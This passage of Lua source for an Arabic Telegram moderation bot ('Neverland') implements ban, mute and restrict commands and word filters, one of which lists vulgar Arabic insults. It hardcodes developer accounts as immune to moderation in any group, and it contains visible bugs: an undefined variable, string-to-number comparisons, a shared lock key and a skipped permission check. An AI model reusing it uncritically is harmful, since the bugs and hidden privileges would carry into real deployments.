send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(2074461232) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(Id_Sudo) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور البوت \n")
return false 
end
if result.id_ == tonumber(1391769117) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
if Rank_Checking(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n*✦┇لا يمكنك (طرد ꒐ حظر ꒐ كتم ꒐ تقييد) *( "..Get_Rank(result.id_,msg.chat_id_).." )")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"✦┇ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"✦┇البوت ليس ادمن يرجى ترقيتي !") 
return false  
end
database:sadd(bot_id.."Neverland:Ban:User"..msg.chat_id_, result.id_)
Kick_Group(msg.chat_id_, result.id_)
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
local UserName = (data.username_ or "TEAM_Neverland")
local NameUserr = "\n*✦┇المستخدم ↜* ["..data.first_name_.."](T.me/"..UserName..")\n"
local keyboard = {}
keyboard.inline_keyboard = {
{
{text = 'الغاء الامر',callback_data=msg.sender_user_id_..'/unban'..result.id_}
}
}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(NameUserr.."✦┇تم حظره من المجموعه").."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)   
end,nil)   
end
else
send(msg.chat_id_, msg.id_, "✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end

if text and text:match("^حظر (%d+)$") and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local userid = text:match("^حظر (%d+)$") 
if not Constructor(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'✦┇لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
return false
end
if userid == tonumber(Id_Sudo) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور البوت \n")
return false 
end
if userid == tonumber(1391769117) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
if result.id_ == tonumber(1799741) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1917848) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if userid == tonumber(1466244479) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if userid == tonumber(2074461232) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if Rank_Checking(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n*✦┇لا يمكنك (طرد ꒐ حظر ꒐ كتم ꒐ تقييد) *( "..Get_Rank(userid,msg.chat_id_).." )")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"✦┇ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"✦┇البوت ليس ادمن يرجى ترقيتي !") 
return false  
end
database:sadd(bot_id.."Neverland:Ban:User"..msg.chat_id_, userid)
Kick_Group(msg.chat_id_, userid)  
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
local UserName = (data.username_ or "TEAM_Neverland")
local NameUserr = "\n*✦┇المستخدم ↜* ["..data.first_name_.."](T.me/"..UserName..")\n"
local keyboard = {}
keyboard.inline_keyboard = {
{
{text = 'الغاء الامر',callback_data=msg.sender_user_id_..'/unban'..userid}
}
}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(NameUserr.."✦┇تم حظره من المجموعه").."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)   
end,nil)   
end
return false
end
if text == ("الغاء حظر") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
function Function_Neverland(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, "✦┇انا لست محظورا \n") 
return false 
end
database:srem(bot_id.."Neverland:Ban:User"..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
Reply_Status(msg,result.sender_user_id_,"reply","✦┇تم الغاء حظره من هنا")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
 
if text and text:match("^الغاء حظر @(.*)$") and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local username = text:match("^الغاء حظر @(.*)$") 
function Function_Neverland(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, "✦┇انا لست محظورا \n") 
return false 
end
database:srem(bot_id.."Neverland:Ban:User"..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
Reply_Status(msg,result.id_,"reply","✦┇تم الغاء حظره من هنا")  
else
send(msg.chat_id_, msg.id_, "✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end

if text and text:match("^الغاء حظر (%d+)$") and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local userid = text:match("^الغاء حظر (%d+)$") 
if tonumber(userid) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, "✦┇انا لست محظورا \n") 
return false 
end
database:srem(bot_id.."Neverland:Ban:User"..msg.chat_id_, userid)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
Reply_Status(msg,userid,"reply","✦┇تم الغاء حظره من هنا")  
return false
end

if text == ("كتم") and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
function Function_Neverland(extra, result, success)
if result.sender_user_id_ == tonumber(1391769117) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس  \n")
return false 
end
if result.sender_user_id_ == tonumber(1466244479) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1799741) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1917848) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.sender_user_id_ == tonumber(2074461232) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.sender_user_id_ == tonumber(Id_Sudo) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور البوت  \n")
return false 
end
if Rank_Checking(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n*✦┇لا يمكنك (طرد ꒐ حظر ꒐ كتم ꒐ تقييد) *( "..Get_Rank(result.sender_user_id_,msg.chat_id_).." )")
return false 
end     
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"✦┇البوت ليس ادمن يرجى ترقيتي !") 
return false  
end
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local UserName = (data.username_ or "TEAM_Neverland")
local NameUserr = "\n*✦┇المستخدم ↜* ["..data.first_name_.."](T.me/"..UserName..")\n"
local keyboard = {}
keyboard.inline_keyboard = {
{
{text = 'الغاء الامر',callback_data=msg.sender_user_id_..'/unktm'..result.sender_user_id_}
}
}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(NameUserr.."*✦┇تم كتمه من المجموعه*").."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)   
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
if text and text:match("^كتم @(.*)$") and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local username = text:match("^كتم @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"✦┇البوت ليس ادمن يرجى ترقيتي !") 
return false  
end
function Function_Neverland(extra, result, success)
if result.id_ then
if result.id_ == tonumber(1391769117) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
if result.id_ == tonumber(1799741) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1917848) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if Rank_Checking(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n*✦┇لا يمكنك (طرد ꒐ حظر ꒐ كتم ꒐ تقييد) *( "..Get_Rank(result.id_,msg.chat_id_).." )")
return false 
end     
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_, result.id_)
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
local UserName = (data.username_ or "TEAM_Neverland")
local NameUserr = "\n*✦┇المستخدم ↜* ["..data.first_name_.."](T.me/"..UserName..")\n"
local keyboard = {}
keyboard.inline_keyboard = {
{
{text = 'الغاء الامر',callback_data=msg.sender_user_id_..'/unktm'..result.id_}
}
}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(NameUserr.."✦┇تم كتمه من المجموعه").."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)   
else
send(msg.chat_id_, msg.id_, "✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end
if text and text:match("^كتم (%d+)$") and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local userid = text:match("^كتم (%d+)$")
if userid == tonumber(1391769117) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
if userid == tonumber(1799741) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if userid == tonumber(1917848) then
send(msg.chat_id_, msg.id_, "✦┇لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مبرمج السورس \n")
return false 
end
if Rank_Checking(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n*✦┇لا يمكنك (طرد ꒐ حظر ꒐ كتم ꒐ تقييد) *( "..Get_Rank(userid,msg.chat_id_).." )")
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"✦┇البوت ليس ادمن يرجى ترقيتي !") 
return false  
end
database:sadd(bot_id.."Neverland:Muted:User"..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
local UserName = (data.username_ or "TEAM_Neverland")
local NameUserr = "\n*✦┇المستخدم ↜* ["..data.first_name_.."](T.me/"..UserName..")\n"
local keyboard = {}
keyboard.inline_keyboard = {
{
{text = 'الغاء الامر',callback_data=msg.sender_user_id_..'/unktm'..userid}
}
}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(NameUserr.."✦┇تم كتمه من المجموعه").."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)   
end
return false
end
if text == ("الغاء كتم") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
function Function_Neverland(extra, result, success)
database:srem(bot_id.."Neverland:Muted:User"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","*✦┇تم الغاء كتمه من هنا*")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
if text and text:match("^الغاء كتم @(.*)$") and Addictive(msg) then
local username = text:match("^الغاء كتم @(.*)$")
function Function_Neverland(extra, result, success)
if result.id_ then
database:srem(bot_id.."Neverland:Muted:User"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","*✦┇تم الغاء كتمه من هن*ا")  
else
send(msg.chat_id_, msg.id_,"*✦┇لا يوجد حساب بهاذا المعرف*")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end

if text and text:match("^الغاء كتم (%d+)$") and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local userid = text:match("^الغاء كتم (%d+)$") 
database:srem(bot_id.."Neverland:Muted:User"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","*✦┇تم الغاء كتمه من هنا*")  
return false
end
if text == 'قفل الفارسيه' and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
database:set(bot_id..'Neverland:lock:Fshar'..msg.chat_id_,true) 
Reply_Status(msg,msg.sender_user_id_,"lock","✦┇تم قفـل الفارسيه")  
end
if text and database:get(bot_id..'Neverland:lock:Fshar'..msg.chat_id_) and not Addictive(msg) then 
list = {"ڄ","گ","که","پی","خسته","برم","راحتی","بیام","بپوشم","گرمه","چه","چ","ڬ","ٺ","چ","ڇ","ڿ","ڀ","ڎ","ݫ","ژ","ڟ","ݜ","ڸ","پ","۴","زدن","دخترا","دیوث","مک","زدن","خالی بند","عزیزم خوبی","سلامت باشی","میخوام","خوببی","ميدم","کی اومدی","خوابیدین"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text == 'فتح الفارسيه' and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
database:del(bot_id..'Neverland:lock:Fshar'..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"lock","✦┇تـم فـتح الفارسيه\n")  
end
if text == "تعطيل المسح التلقائي" or text == "تعطيل المسح" and Owner(msg) then        
database:set(bot_id.."y:Neverland:msg:media"..msg.chat_id_,true)
Reply_Status(msg,msg.sender_user_id_,"lock",'*✦┇تم تعطيل المسح التلقائي للميديا*')
return false
end 
if text == "تفعيل المسح التلقائي" or text == "تفعيل المسح" and Owner(msg) then        
database:del(bot_id.."y:Neverland:msg:media"..msg.chat_id_)
Reply_Status(msg,msg.sender_user_id_,"lock",'✦┇تم تفعيل المسح التلقائي للميديا')
return false
end 
if text == 'قفل الفشار' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id..'Neverland:lock:Fshar'..msg.chat_id_,true) 
Reply_Status(msg,msg.sender_user_id_,"lock","✦┇تم قفل الفشار")  
end
if text and database:get(bot_id..'Neverland:lock:Fshar'..msg.chat_id_) and not Constructor(msg) then 
list = {"كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text == 'فتح الفشار' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id..'Neverland:lock:Fshar'..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"lock","✦┇تـم فـتح الفشار\n")  
end
if text == 'قفل الانكليزيه' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id..'Neverland:lock:Engilsh'..msg.chat_id_,true) 
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم قفل الانكليزيه*")  
end
if text and database:get(bot_id..'Neverland:lock:Engilsh'..msg.chat_id_) and not Constructor(msg) then 
list = {'a','u','y','l','t','b','A','Q','U','J','K','L','B','D','L','V','Z','k','n','c','r','q','o','z','I','j','m','M','w','d','h','e'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text == 'فتح الانكليزيه' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id..'Neverland:lock:Engilsh'..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم فتح الانكليزيه*\n")  
end
if text == ("تقيد") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
function Function_Neverland(extra, result, success)
if Rank_Checking(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n*✦┇لا يمكنك (طرد ꒐ حظر ꒐ كتم ꒐ تقييد) *( "..Get_Rank(result.sender_user_id_,msg.chat_id_).." )")
else
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local UserName = (data.username_ or "TEAM_Neverland")
local NameUserr = "\n*✦┇المستخدم ↜* ["..data.first_name_.."](T.me/"..UserName..")\n"
local keyboard = {}
keyboard.inline_keyboard = {
{
{text = 'الغاء الامر',callback_data=msg.sender_user_id_..'/unkkid'..result.sender_user_id_}
}
}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(NameUserr.."✦┇تم تقييده من المجموعه").."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^تقيد @(.*)$") and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local username = text:match("^تقيد @(.*)$")
function Function_Neverland(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if Rank_Checking(result.id_, msg.chat_id_) then
